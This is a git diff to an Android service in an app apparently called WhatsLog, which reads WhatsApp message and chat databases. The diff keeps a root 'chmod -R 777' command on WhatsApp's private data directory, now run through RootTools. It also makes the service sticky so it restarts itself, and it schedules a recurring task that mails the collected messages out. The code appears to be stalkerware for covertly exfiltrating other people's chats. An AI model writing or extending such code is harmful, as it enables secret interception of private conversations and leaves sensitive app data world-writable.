@@ -1,6 +1,5 @@
 package com.whatslog;
 
-import java.io.DataOutputStream;
 import java.io.File;
 import java.io.IOException;
 import java.sql.SQLException;
@@ -16,12 +15,15 @@ import java.util.concurrent.TimeUnit;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageManager.NameNotFoundException;
+import android.os.Binder;
 import android.os.FileObserver;
 import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 
 import com.j256.ormlite.dao.Dao;
+import com.stericson.RootTools.RootTools;
+import com.stericson.RootTools.execution.CommandCapture;
 import com.whatslog.dao.DatabaseHelperConfiguracao;
 import com.whatslog.dao.DatabaseHelperExternal;
 import com.whatslog.dao.DatabaseHelperInternal;
@@ -37,52 +39,41 @@ public class MainService extends Service {
 	private Dao<Messages, Integer> daoMsgExternal;
 	private Dao<ChatList, Integer> daoChatInternal;
 	private Dao<ChatList, Integer> daoChatExternal;
-	private ScheduledExecutorService scheduleTaskExecutor;
-	private ScheduledFuture<?> scheduledFuture;
+
 	private DatabaseHelperInternal internal;
 	private DatabaseHelperExternal external;
 	private Map<String, List<Messages>> listaMensagens;
 	private Configuracao configuracao;
+    private final IBinder mBinder = new LocalBinder();
 
+
+    public class LocalBinder extends Binder {
+    	MainService getService() {
+            return MainService.this;
+        }
+    }
 
 	public MainService() {
 	}
 
 	@Override
 	public IBinder onBind(Intent intent) {
-		// TODO: Return the communication channel to the service.
-		throw new UnsupportedOperationException("Not yet implemented");
+		return mBinder;
 	}
 
 	private void chmod() {
-		Process process = null;
-		DataOutputStream dataOutputStream = null;
-		try {
-			process = Runtime.getRuntime().exec("su");
-			dataOutputStream = new DataOutputStream(process.getOutputStream());
-			dataOutputStream.writeBytes("chmod -R 777 "
-					+ android.os.Environment.getDataDirectory().toString()
-					+ "/data/com.whatsapp\n");
-			dataOutputStream
-					.writeBytes("chmod -R 777 "
-							+ getApplicationContext().getPackageManager()
-									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
-							+ "\n");
 
-			dataOutputStream.writeBytes("exit\n");
-			dataOutputStream.flush();
-			process.waitFor();
-		} catch (Exception e) {
+		try{
+			CommandCapture command = new CommandCapture(0, "chmod -R 777 "
+				+ android.os.Environment.getDataDirectory().toString()
+				+ "/data/com.whatsapp", "chmod -R 777 "
+						+ getApplicationContext().getPackageManager()
+						.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);
+			RootTools.getShell(true).add(command);
+		}catch(Exception e){
 			e.printStackTrace();
-		} finally {
-			try {
-				if (dataOutputStream != null) {
-					dataOutputStream.close();
-				}
-				process.destroy();
-			} catch (Exception e) {
-			}
 		}
+
 	}
 
 	@Override
@@ -174,16 +165,14 @@ public class MainService extends Service {
 				startMail();
 				// For time consuming an long tasks you can launch a new thread here...
 				Toast.makeText(this, " Service Started", Toast.LENGTH_LONG).show();
-				return startId;
+				return START_STICKY;
 	}
 
 	private void startMail(){
-
-		scheduleTaskExecutor = Executors.newScheduledThreadPool(1);
-		if(scheduledFuture!=null)
-			scheduledFuture.cancel(true);
-
-		scheduledFuture=scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
+		if(Utils.scheduledFuture!=null){
+			Utils.scheduledFuture.cancel(true);
+		}
+		Utils.scheduledFuture=Utils.getScheduleTaskExecutor().scheduleWithFixedDelay(new Runnable() {
 			public void run() {
 				HtmlHelper htmlHelper=new HtmlHelper(getApplicationContext());
 				htmlHelper.sendMails();
